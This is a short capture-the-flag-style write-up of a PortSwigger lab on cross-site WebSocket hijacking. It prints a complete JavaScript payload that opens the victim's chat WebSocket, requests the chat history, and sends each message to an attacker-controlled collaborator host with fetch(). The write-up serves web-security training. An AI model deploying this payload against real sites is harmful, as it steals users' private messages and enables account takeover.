# Practitioner Lab 97 : Cross-site WebSocket hijacking

---

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this gain access to their account.

![Untitled](Practitioner%20Lab%2097%20Cross-site%20WebSocket%20hijacking%200f974feb86244b55a2e1b440621461f3/Untitled.png)

I used this websocket handshake and switched the origin to the server that I control to see if it was vulnerable and it was. 

![Untitled](Practitioner%20Lab%2097%20Cross-site%20WebSocket%20hijacking%200f974feb86244b55a2e1b440621461f3/Untitled%201.png)

```
<script>
websocket = new WebSocket('wss://0a92002603b4c7e4832ccdc700df00c6.web-security-academy.net/chat')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://wmm8ajuml28ntg7eyuwmc9y7dyjp7mvb.oastify.com/?'+event.data, {mode: 'no-cors'})
}
</script>
```

![Untitled](Practitioner%20Lab%2097%20Cross-site%20WebSocket%20hijacking%200f974feb86244b55a2e1b440621461f3/Untitled%202.png)